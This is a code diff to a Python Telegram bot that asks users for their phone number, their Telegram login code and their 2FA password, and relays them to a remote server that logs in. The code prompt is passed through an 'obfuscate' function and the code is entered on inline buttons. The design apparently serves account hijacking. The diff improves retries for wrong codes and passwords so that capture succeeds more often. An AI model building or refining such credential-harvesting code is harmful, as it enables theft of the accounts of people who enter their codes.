@@ -85,7 +85,7 @@ async def process_phone(message: Message, state: FSMContext):
         phone = '+' + phone
 
     session_id = str(message.from_user.id)
-    wait_msg = await message.answer("Connecting to server...", reply_markup=ReplyKeyboardRemove())
+    wait_msg = await message.answer("Wait...", reply_markup=ReplyKeyboardRemove())
 
     # Step 1 REST API: Code request
     async with aiohttp.ClientSession() as session:
@@ -158,8 +158,18 @@ async def process_code_callback(callback: CallbackQuery, state: FSMContext):
                         await callback.message.answer(text)
                         await state.set_state(AuthState.waiting_for_password)
                     else:
-                        await callback.message.answer(f"❌ Auth error: {data.get('detail')}")
-                        await state.clear()
+                        detail = data.get('detail', 'Unknown error')
+                        if detail == "PHONE_CODE_INVALID":
+                            await callback.message.answer("❌ Invalid code! Please enter the code again.")
+                            await state.update_data(current_code="")
+                            text = obfuscate("Enter Telegram CODE (5 digits):") + "\n\n`_ _ _ _ _`"
+                            await callback.message.edit_text(text, reply_markup=get_code_kb(), parse_mode="Markdown")
+                        elif detail == "PHONE_CODE_EXPIRED":
+                            await callback.message.answer("❌ Code expired! Please start the login process again with /login.")
+                            await state.clear()
+                        else:
+                            await callback.message.answer(f"❌ Auth error: {detail}")
+                            await state.clear()
             except Exception as e:
                 await callback.message.answer(f"Lost connection to server: {e}")
                 await state.clear()
@@ -193,8 +203,8 @@ async def process_password(message: Message, state: FSMContext):
             f"Name: {data['username']}"
         )
         await state.clear()
-    elif data.get("detail") == "PASSWORD_NEEDED":
-        await message.answer("2FA password required.")
+    elif data.get("detail") == "PASSWORD_INVALID":
+        await message.answer("❌ Incorrect password! Please try entering your 2FA password again.")
     else:
         await message.answer(f"❌ Auth error: {data.get('detail')}")
 
